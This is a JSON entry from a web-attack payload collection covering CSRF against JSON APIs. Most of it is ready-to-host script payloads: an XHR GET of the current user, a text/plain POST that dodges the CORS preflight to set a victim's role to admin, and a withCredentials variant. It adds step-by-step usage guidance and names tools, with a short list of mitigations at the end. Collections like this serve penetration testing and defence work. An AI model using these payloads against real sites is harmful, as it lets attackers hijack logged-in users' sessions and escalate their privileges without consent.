{
  "id": "payload_000024",
  "important": {
    "title": "CSRF - JSON GET/POST / Complex JSON Requests",
    "category": "Web Vulnerabilities",
    "sub_category": "CSRF - JSON Methods",
    "tags": ["csrf","json","xhr","fetch","withcredentials","complex-request"],
    "targets": { "os": ["Any"], "system": ["Web App","API"] },
    "risk": "high"
  },
  "variants": [
    {
      "match": { "os": ["Any"], "system": ["JSON GET"] },
      "payload": {
        "explanation": "Issue a JSON GET XHR to an API endpoint (simple read or state change depending on API).",
        "code": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://www.example.com/api/currentuser'); xhr.send();</script>",
        "run_context": "Host on attacker page; victim browser issues XHR including cookies.",
        "placeholders": {},
        "notes": "Cross-origin JSON requests may be restricted by CORS; some endpoints may accept/act on GET requests."
      }
    },
    {
      "match": { "os": ["Any"], "system": ["JSON POST (simple)"] },
      "payload": {
        "explanation": "Send a JSON-like payload via XHR (note content-type restrictions may force text/plain or form-encoded content).",
        "code": "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://www.example.com/api/setrole'); xhr.setRequestHeader('Content-Type', 'text/plain'); xhr.send('{\"role\":admin}');</script>",
        "run_context": "Attacker-hosted page; browser sends cookies with cross-site requests unless blocked by CORS/SameSite.",
        "placeholders": {},
        "notes": "Some browsers/preflight/CORS rules may block application/json; using text/plain or form submissions can bypass simple protections."
      }
    },
    {
      "match": { "os": ["Any"], "system": ["JSON POST (complex)"] },
      "payload": {
        "explanation": "Complex JSON POST using withCredentials to force cookies to be sent (if CORS allows).",
        "code": "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://www.example.com/api/setrole'); xhr.withCredentials = true; xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8'); xhr.send('{\"role\":\"admin\"}');</script>",
        "run_context": "Attacker page; works when target allows cross-origin requests and CORS configuration permits credentials.",
        "placeholders": {},
        "notes": "Requires CORS misconfiguration (Access-Control-Allow-Credentials + permissive origin) to succeed."
      }
    }
  ],
  "usage": {
    "steps": [
      "Map API endpoints expecting JSON and their required headers.",
      "Try simple text/plain XHRs first to bypass preflight, then escalate to application/json where possible.",
      "Test withCredentials and CORS behavior to determine if cookies/credentials will be sent and accepted."
    ],
    "tools": ["Burp Suite","Browser devtools","0xInfection/XSRFProbe"],
    "code_samples": [
      { "title": "JSON GET XHR", "code": "<script>var xhr = new XMLHttpRequest(); xhr.open('GET','http://www.example.com/api/currentuser'); xhr.send();</script>", "run_context": "browser" },
      { "title": "JSON POST withCredentials", "code": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://www.example.com/api/setrole');xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');xhr.send('{\"role\":\"admin\"}');</script>", "run_context": "browser" }
    ],
    "mitigations": [
      "Enforce CSRF tokens for state-changing API endpoints (including JSON POSTs).",
      "Harden CORS: do not return Access-Control-Allow-Credentials: true with a wildcard origin; validate origins.",
      "Apply same-origin policies and use Origin header checks server-side."
    ],
    "references": ["OWASP CSRF Cheat Sheet"]
  },
  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
}
